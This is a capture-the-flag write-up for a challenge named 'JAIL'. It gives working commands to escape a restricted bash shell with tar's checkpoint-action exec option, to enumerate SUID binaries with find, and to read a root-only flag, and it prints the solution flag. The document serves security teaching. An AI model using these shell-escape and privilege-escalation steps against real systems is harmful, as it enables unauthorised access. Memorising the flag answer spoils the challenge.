# JAIL - Official Writeup

## Challenge Description
Locked in Mojo-Jojo's unbreakable prison. Decoys laugh at you. The real flag hides deep. Escape and steal the ape's secrets—or stay caged forever.

## Step-by-Step Solution

### 1. Environment Enumeration
Upon logging in, you find yourself in a restricted shell (`rbash`). You can explore available commands by looking at your `PATH`:
```bash
echo $PATH
# Output: /home/ctfuser/jail
```
Checking the `jail` directory reveals only one tool:
```bash
ls jail/
# (If ls is missing, use echo jail/*)
# Output: jail/tar
```

### 2. Escape the Restricted Shell
The `tar` binary can be used to execute commands via its checkpoint action. Since we are in `rbash`, we cannot directly call binaries with slashes, but `tar`'s internal execution mechanism allows us to bypass this.

Use `tar` to spawn an interactive bash shell:
```bash
tar -cf /dev/null testfile --checkpoint=1 --checkpoint-action=exec="/bin/bash -i"
```
**Observation**: The prompt changes from `rbash-jail:~$ ` to `ctfuser$ `. The shell is no longer restricted.

### 3. Verify the Escape
Check the new environment. You will see that the `PATH` has been expanded:
```bash
echo $PATH
# Output: /home/ctfuser/jail:/usr/bin:/bin
```

### 4. Locate the Real Flag Vector
Search the filesystem for SUID binaries to find a way to read the protected flag:
```bash
find / -perm -u=s -type f 2>/dev/null
# Output includes: /opt/hidden_bins/flag_reader
```

### 5. Read the Flag
The real flag at `/opt/.secrets/flag.txt` is root-only. Use the found SUID binary to read it:
```bash
/opt/hidden_bins/flag_reader
```

## Exploit Summary
- **Vulnerability**: Tar Wildcard/Checkpoint injection (arbitrary command execution).
- **Escape Vector**: Spawning `/bin/bash` from `tar` to exit `rbash`.
- **Privilege Escalation**: SUID `flag_reader` to read a root-protected file.
- **Flag**: `MOJO-JOJO{W0W_YOU_F0UND_IT_DO_YOU_WANT_A_B4NAN4_FOR_Y0UR_MEDIOCRE_EFFORT?!!}`
